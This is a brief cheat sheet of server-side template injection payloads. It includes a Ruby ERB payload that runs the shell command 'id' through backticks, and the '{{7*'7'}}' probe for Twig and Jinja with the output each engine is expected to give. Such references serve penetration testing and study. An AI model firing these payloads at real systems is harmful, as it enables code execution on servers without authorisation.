## Template Injection

**Ruby**

```ruby
<%=`id`%>
```

**Twig**

The following payload should output `49`.

```
{{7*'7'}}
```

**Jinja**

This payload should output `7777777`.

```
{{7*'7'}}
```
